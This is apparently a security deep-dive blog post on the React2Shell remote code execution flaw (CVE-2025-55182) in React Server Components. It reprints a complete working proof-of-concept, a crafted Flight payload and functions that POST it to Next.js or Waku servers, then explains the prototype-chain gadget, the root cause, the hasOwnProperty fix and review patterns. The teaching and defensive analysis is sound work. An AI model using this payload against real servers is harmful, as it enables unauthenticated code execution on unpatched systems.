# CVE Deep Dive - CVE-2025-55182 - React2Shell

## Introduction

React2Shell is a critical remote code execution (RCE) vulnerability discovered in React Server Components (RSC), specifically in the deserialization logic of the React Flight protocol. 

React Flight is a custom protocol designed specifically for React Server Components (RSC) to serialize and stream component data between server and client. It was created because traditional JSON serialization couldn't handle the advanced features needed for RSC.

The vulnerability was discovered by security researcher Lachlan Davidson and responsibly disclosed to Meta on November 29, 2025, with public disclosure and patches released on December 3, 2025. 

**Severity**: CVSS 10.0 (Critical) 

## Impact

React2Shell allows unauthenticated remote attackers to execute arbitrary JavaScript code on vulnerable servers. This represents a complete compromise of the confidentiality, integrity, and availability of affected systems.

## Affected Components / Scope

**React Packages** (versions 19.0.0, 19.1.0, 19.1.1, 19.2.0):

- `react-server-dom-webpack`
- `react-server-dom-parcel`
- `react-server-dom-turbopack`

Update to 19.0.1, 19.1.2 or 19.2.1 to patch it

## Exploiting

Proof of concept by Lachlan Davidson

Src: https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc/blob/main/01-submitted-poc.js

```jsx
const payload = {
    '0': '$1',
    '1': {
        'status':'resolved_model',
        'reason':0,
        '_response':'$4',
        'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
        'then':'$2:then'
    },
    '2': '$@3',
    '3': [],
    '4': {
        '_prefix':'console.log(7*7+1)//',
        '_formData':{
            'get':'$3:constructor:constructor'
        },
        '_chunks':'$2:_response:_chunks',
    }
}

const FormDataLib = require('form-data')

const fd = new FormDataLib()

for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]))
}

console.log(fd.getBuffer().toString())

console.log(fd.getHeaders())

function exploitNext(baseUrl) {
    fetch(baseUrl, {
        method: 'POST',
        headers: {
            'next-action': 'x',
            ...fd.getHeaders()
        },
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}

function exploitWaku(baseUrl) {
    fetch(baseUrl + '/RSC/foo.txt', {
        method: 'POST',
        headers: fd.getHeaders(),
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}

// Place the correct URL and uncomment the line
// exploitNext('http://localhost:3003')
```

### React's Custom Symbols

Note: `$` and `@` are React notations (syntax patterns and conventions that serve particular functions).

* `$` - React's reference marker
    * Indicates "this is a reference to another object in the payload"
    * Format invented by React team for their serialization needs
* `@` - React's promise/async marker
    * Indicates "this is a promise reference"
    * Used in React's async component resolution
* `B` - React's blob marker (when used as `$B`)
    * Indicates binary/blob data reference

### The Payload Structure

The PoC constructs a malicious payload object with carefully crafted references that exploit React's deserialization logic:

```jsx
const payload = {
    '0': '$1',
    '1': { /* main exploit object */ },
    '2': '$@3',
    '3': [],
    '4': { /* gadget object */ }
}
```

**Key '0': Entry Point**

```jsx
'0':'$1'
```

- This is the **entry point** that React will deserialize first
- `$1` is a reference telling React to look at the object stored at key `1`

**Key '3': The Gadget Foundation**

```jsx
'3':[]
```

- An **empty array** that serves as the starting point for prototype chain traversal
- This is the critical gadget that will be abused to reach `Function()` constructor

**Key '4': The Malicious Gadget Object**

```jsx
'4': {
    '_prefix': 'console.log(7*7+1)//',
    '_formData': {
        'get': '$3:constructor:constructor'
    },
    '_chunks': '$2:_response:_chunks',
}
```

This is where the magic happens:

**`_formData.get`**: Points to `$3:constructor:constructor`

- `$3` → resolves to `[]` (the empty array at key 3)
- `:constructor` → accesses `Array.constructor` (the Array function)
- `:constructor` → accesses `Function.constructor` (the Function constructor itself)
- **Result**: `_formData.get` becomes the `Function()` constructor

**`_prefix`**: Contains the malicious code to execute

- `'console.log(7*7+1)//'` is the JavaScript code
- The `//` at the end comments out anything React appends

**Key '2': Promise Reference**

```jsx
'2':'$@3'
```

- `$@3` creates a promise reference to key 3
- This helps trigger React's async resolution logic

**Key '1': The Orchestrator**

```jsx
'1': {
    'status': 'resolved_model',
    'reason': 0,
    '_response': '$4',
    'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
    'then': '$2:then'
}
```

This object orchestrates the exploit:

**`_response: '$4'`**: Points to the gadget object at key 4

**`value`**: Contains a JSON string with:

- `"then":"$3:map"` - References the array's `map` method
- `"0":{"then":"$B3"}` - Creates a blob reference `$B3`
- This structure tricks React into processing a blob

**`then: '$2:then'`**: References promise handling logic

### The Execution Flow

When React deserializes this payload, here's what happens:

1. **React starts at key '0'** → follows reference to key '1'
2. **Processes key '1'** → sees `_response: '$4'` and `value` with blob reference `$B3`
3. **Resolves blob reference** `$B3`:
    - React's internal code does something like:
    
    ```jsx
    response._formData.get(response._prefix + '3')
    ```
    
4. **Gadget chain activates**:
    - `response` points to key '4'
    - `response._formData.get` resolves to `$3:constructor:constructor` → `Function`
    - `response._prefix` is `'console.log(7*7+1)//'`
5. **Code execution**:
    
    ```jsx
    Function('console.log(7*7+1)//3')
    // Executes: console.log(50)
    // The '//3' is commented out
    ```
    

### Why This Works

The exploit succeeds because:

1. **No property ownership validation**: React doesn't check if `constructor` is an "own property" of the array
2. **Prototype chain access**: The `:constructor:constructor` path walks up the prototype chain
3. **Function constructor injection**: Gets access to `Function()` which is equivalent to `eval()`
4. **Blob resolution trigger**: The `$B3` reference triggers the vulnerable code path
5. **Code injection**: The `_prefix` value becomes the code to execute

## Dismantling

### **Root Cause**

**Design Flaw**: The vulnerability happens because of a trust boundary violation in React's deserialization logic. React Server Components use a custom serialization protocol (React Flight) to transmit component data between server and client. The deserialization process trusted that incoming payloads contained only React-internal object structures without validating property ownership.

**Implementation Bug**: The critical bug was the absence of `hasOwnProperty` checks when traversing object properties during reference resolution. This allowed the deserialization logic to walk up JavaScript's prototype chain instead of limiting access to an object's own properties.

**Vulnerable Code Pattern** (conceptual representation):

```jsx
// VULNERABLE: No ownership validation
function resolveReference(obj, path) {
  let value = obj;
  for (let i = 0; i < path.length; i++) {
    const name = path[i];
    value = value[name];  // Walks prototype chain!
  }
  return value;
}
```

When processing a reference like `$3:constructor:constructor`:

- The code starts with object at key `3` (an empty array `[]`)
- Accesses `.constructor` → gets `Array` (inherited from prototype)
- Accesses `.constructor` again → gets `Function` (inherited from Array's prototype)
- Returns `Function` constructor, which is equivalent to `eval()`

## Deep Dive

### The issue

**What is the Prototype Chain?**

In JavaScript, every object has an internal link to another object called its **prototype**. This creates a chain of inheritance:

```jsx
const arr = [];

// The prototype chain:
arr → Array.prototype → Object.prototype → null
```

When you access a property on an object, JavaScript searches:

1. **Own properties** (directly on the object)
2. **Prototype properties** (inherited from prototype chain)
3. Up the chain until it finds the property or reaches `null`

```jsx
const arr = [];

// Own property check
arr.hasOwnProperty('length')  // true - 'length' is own property
arr.hasOwnProperty('constructor')  // false - inherited!

// But you can still access it:
arr.constructor  // Returns: Array function
arr.constructor.constructor  // Returns: Function constructor
```

```jsx
const str = "Hello";
str.__proto__ === String.prototype; // true
str.__proto__.__proto__ === Object.prototype; // true
str.__proto__.__proto__.__proto__; // null
```

### The fix

The fix involves verifying the ownership using `hasOwnProperty` 

- `packages/react-server-dom-parcel/src/client/ReactFlightClientConfigBundlerParcel.js`,
- `packages/react-server-dom-turbopack/src/client/ReactFlightClientConfigBundlerTurbopack.js`,
- `packages/react-server-dom-webpack/src/client/ReactFlightClientConfigBundlerNode.js`

```jsx
// unsafe
return moduleExports[metadata[NAME]];
// unsafe
return moduleExports[metadata.name];

// safe 
if (hasOwnProperty.call(moduleExports, metadata[NAME])) {
  return moduleExports[metadata[NAME]];
}
return (undefined: any);
// safe
if (hasOwnProperty.call(moduleExports, metadata.name)) {
  return moduleExports[metadata.name];
}
return (undefined: any);
```

And in packages/react-server/src/ReactFlightReplyServer.js

```jsx
// unsafe 
value = value[path[i]];
return map(response, value);

// safe 
const name = path[i];
if (typeof value === 'object' && hasOwnProperty.call(value, name)) {
    value = value[name];
  }
}
```

Note: this [PR](https://github.com/facebook/react/pull/35277) also tries to synchronize the two approaches from PRs [#29823](https://github.com/facebook/react/pull/29823) and [#33664](https://github.com/facebook/react/pull/33664).

## How to Find Similar Issues

**Threat Modeling Key Questions:**

1. Does the application deserialize user-controlled data?
2. Are there trust boundaries between serialization and deserialization?
3. Can attackers control object structures in serialized payloads?
4. Does deserialization access object properties without validation?
5. Are prototype chain traversals possible during deserialization?

**Code Review Focus Areas**:

1. Custom deserialization logic
2. Object property traversal loops
3. Dynamic property access (`obj[key]`)
4. Reference resolution mechanisms
5. Prototype chain interactions
6. Constructor access patterns

### **Code Patterns to Review**

**Dangerous Patterns**:

```jsx
// UNSAFE: No property ownership check
function traverse(obj, path) {
  let current = obj;
  for (const key of path) {
    current = current[key];  // Prototype chain access
  }
  return current;
}

// UNSAFE: Dynamic property access without validation
function resolve(data, ref) {
  const parts = ref.split('.');
  return parts.reduce((obj, key) => obj[key], data);
}

// UNSAFE: Eval-like constructs
const fn = new Function(userInput);
const result = eval(userInput);
```

**Safe Patterns**:

```jsx
// SAFE: Property ownership validation
function traverse(obj, path) {
  let current = obj;
  for (const key of path) {
    if (Object.prototype.hasOwnProperty.call(current, key)) {
      current = current[key];
    } else {
      throw new Error('Invalid path');
    }
  }
  return current;
}

// SAFE: Whitelist approach
function resolve(data, ref) {
  const allowedKeys = new Set(['id', 'name', 'value']);
  const parts = ref.split('.');
  
  let current = data;
  for (const key of parts) {
    if (!allowedKeys.has(key)) {
      throw new Error('Disallowed key');
    }
    if (!Object.prototype.hasOwnProperty.call(current, key)) {
      throw new Error('Key not found');
    }
    current = current[key];
  }
  return current;
}
```

## Prevention

- Treat all incoming serialized data as potentially malicious
- Validate structure and content before processing
- Use schema validation

## References

- [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182) (React Server Components)
- [CVE-2025-66478](https://nvd.nist.gov/vuln/detail/CVE-2025-66478) (Next.js)
- [CVE-2025-55183](https://nvd.nist.gov/vuln/detail/CVE-2025-55183) (Source code exposure)
- [CVE-2025-55184](https://nvd.nist.gov/vuln/detail/CVE-2025-55184) (Denial of Service)
- https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc
- https://react2shell.com/
- https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
- https://github.com/facebook/react/pull/35277/files
- https://github.com/facebook/react/commit/e2fd5dc6ad973dd3f220056404d0ae0a8707998d
- https://www.geeksforgeeks.org/javascript/understanding-the-prototype-chain-in-javascript/
- https://javascript.plainenglish.io/prototype-vs-prototype-chain-7766415a75d6
- https://medium.com/@felipe_bello/proto-and-prototype-chaining-understanding-inheritance-in-javascript-e8f026f99ec3
